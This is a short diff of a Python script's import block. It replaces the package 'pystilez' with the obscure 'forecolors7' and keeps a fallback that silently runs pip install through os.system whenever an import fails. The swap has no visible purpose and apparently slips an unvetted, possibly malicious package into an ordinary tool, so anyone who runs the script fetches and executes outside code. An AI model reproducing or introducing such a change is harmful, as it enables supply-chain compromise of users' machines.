@@ -11,20 +11,20 @@ try:
     from colorama import Fore
     from fake_useragent import UserAgent as ua
     from bs4 import BeautifulSoup as Soup
-    import pystilez
+    import forecolors7
 except:
     os.system(f'{sys.executable} -m pip install requests')
     os.system(f'{sys.executable} -m pip install easygui')
     os.system(f'{sys.executable} -m pip install colorama')
     os.system(f'{sys.executable} -m pip install fake_useragent')
-    os.system(f'{sys.executable} -m pip install pystilez')
+    os.system(f'{sys.executable} -m pip install forecolors7')
     os.system(f'{sys.executable} -m pip install bs4')
     import requests
     import easygui
     from colorama import Fore
     from fake_useragent import UserAgent as ua
     from bs4 import BeautifulSoup as Soup
-    import pystilez
+    import forecolors7
 
 def center(var:str, space:int=None): # From Pycenter
     if not space:
